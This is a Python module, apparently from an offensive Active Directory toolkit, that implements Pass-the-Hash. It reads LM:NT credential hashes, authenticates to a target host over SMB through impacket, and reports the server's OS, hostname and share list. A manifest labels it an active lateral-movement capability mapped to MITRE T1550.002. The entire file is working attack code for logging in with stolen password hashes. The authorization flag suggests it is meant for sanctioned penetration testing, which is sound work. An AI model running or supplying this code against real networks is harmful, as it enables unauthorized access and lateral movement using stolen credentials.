"""Pass-the-Hash — authenticate with NTLM hash via SMB/WMI."""

from __future__ import annotations

import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.lateral.pth.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["smb_authentication", "remote_command_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1550.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    if not cred.has_hash:
        print("[!] Pass-the-Hash requires --hashes LM:NT", file=sys.stderr)
        return 1

    print(f"[*] Pass-the-Hash → {args.target} ({args.domain}\\{cred.username})")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        smb = SMBConnection(args.target, args.target, sess_port=445)
        smb.login(cred.username, "", args.domain, cred.lm_hash, cred.nt_hash)
        print(f"[+] SMB authentication successful as {args.domain}\\{cred.username}")
        print(f"    OS: {smb.getServerOS()}")
        print(f"    Hostname: {smb.getServerName()}")

        shares = smb.listShares()
        print(f"    Shares: {', '.join(s['shi1_netname'].rstrip(chr(0)) for s in shares)}")

        smb.logoff()
        return 0
    except Exception as exc:
        print(f"[-] PtH failed: {exc}", file=sys.stderr)
        return 1
